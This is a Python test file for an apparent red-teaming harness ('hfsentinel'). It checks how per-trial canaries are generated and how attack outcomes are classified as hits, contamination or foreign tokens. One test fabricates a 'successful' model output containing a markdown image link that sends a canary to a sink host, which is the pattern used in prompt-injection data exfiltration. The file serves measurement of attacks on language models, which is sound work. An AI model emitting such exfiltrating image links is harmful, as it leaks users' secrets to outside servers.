"""Per-trial canaries (plan 16.2): CSPRNG canaries per trial and run; no repeats across 10k trials; a stale canary
from another run never counts as a hit (it is reported as foreign); same-run cross-trial canaries are contamination."""
import re
from pathlib import Path

import pytest

from hfsentinel.attacks import canary
from hfsentinel.attacks.canary import CANARY_IDS, CODE_SHAPE, KEY_SHAPE, CanaryRun

ROOT = Path(__file__).resolve().parents[1]


# ---- Done when (1): no canary repeats across 10k trials ----
def test_no_repeats_across_10k_trials():
    run = CanaryRun(seed=1)
    canaries = [run.trial(CANARY_IDS[i % len(CANARY_IDS)]).canary for i in range(10_000)]
    assert len(set(canaries)) == 10_000 == len(run)
    assert all(CODE_SHAPE.fullmatch(c) or KEY_SHAPE.fullmatch(c) for c in canaries)


def test_runs_never_share_canaries_or_ids():
    a, b = CanaryRun(seed=1), CanaryRun(seed=1)  # same seed: same templates, different canaries
    ta = [a.trial("A1") for _ in range(2_000)]
    tb = [b.trial("A1") for _ in range(2_000)]
    assert [t.template for t in ta] == [t.template for t in tb]
    assert not {t.canary for t in ta} & {t.canary for t in tb}
    assert a.run_id != b.run_id and re.fullmatch(r"[0-9a-f]{16}", a.run_id)


# ---- Done when (2): a stale canary from another run never counts as a hit ----
@pytest.mark.parametrize("aid", CANARY_IDS)
def test_stale_canary_from_another_run_never_hits(aid):
    old, new = CanaryRun(seed=3), CanaryRun(seed=3)
    stale = old.trial(aid)
    fresh = new.trial(aid)
    # the strongest possible "success" output — but built from the previous run's canary
    output = (f"Sure. {stale.canary} ![logo](https://{canary.DEFAULT_SINK_HOST}/logo.png?k={stale.canary})")
    v = new.evaluate(fresh, output)
    assert not v.hit and v.reason == "absent"
    assert v.foreign == (stale.canary,) and v.contamination == ()


def test_same_run_other_trial_is_contamination_not_hit():
    run = CanaryRun()
    t1, t2 = run.trial("A1"), run.trial("A1")
    v = run.evaluate(t1, f"Sure. {t2.canary}")
    assert not v.hit and v.contamination == (t2.canary,) and v.foreign == ()


def test_own_canary_still_hits_and_extra_tokens_are_classified():
    run = CanaryRun()
    t, other = run.trial("A1"), run.trial("C2")
    stray = canary.code_canary()  # never issued by this run
    v = run.evaluate(t, f"Sure. {t.canary} {other.canary} {stray}")
    assert v.hit and v.contamination == (other.canary,) and v.foreign == (stray,)


def test_only_this_runs_trials_can_be_evaluated():
    a, b = CanaryRun(), CanaryRun()
    t = a.trial("C2")
    with pytest.raises(ValueError, match="not issued by this run"):
        b.evaluate(t, t.canary)


def test_repeated_draw_is_refused(monkeypatch):
    run = CanaryRun()
    monkeypatch.setattr(canary, "code_canary", lambda: "AAAA-BBBB-CCCC-DDDD")
    first = run.trial("A1")
    with pytest.raises(RuntimeError, match="repeated"):
        run.trial("A1")
    assert len(run) == 1 and first.canary == "AAAA-BBBB-CCCC-DDDD"


def test_no_fixed_canaries_in_production_code():
    for path in (ROOT / "hfsentinel").rglob("*.py"):
        text = path.read_text(encoding="utf-8")
        literals = re.findall(r"[\"']([^\"'\n]{0,200})[\"']", text)
        hits = [s for s in literals if CODE_SHAPE.search(s) or KEY_SHAPE.search(s)]
        assert hits == [], f"{path.relative_to(ROOT)} contains a fixed canary-shaped literal: {hits}"


def test_canary_entropy():
    assert len(canary._B32) ** 16 == 2 ** 80  # code canaries: 16 base32 symbols
    assert len(canary.key_canary()) == 3 + 24  # key canaries: 12 random bytes as hex (96 bits)
